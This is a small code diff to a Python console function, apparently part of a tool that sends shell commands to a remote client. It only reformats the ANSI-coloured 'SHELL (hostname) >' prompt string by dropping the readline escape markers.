@@ -130,9 +130,7 @@ def get_client(cmd):
 
 
 def send_shell_commands_for_console(client):
-    module_prompt_default_template = (
-        "\001\033[4m\002SHELL\001\033[0m\002 (\001\033[91m\002{hostname}\001\033[0m\002) > "
-    )
+    module_prompt_default_template = "\033[4mSHELL\033[0m (\033[91m{hostname}\033[0m) > "
     while True:
         cmd = None
         try:
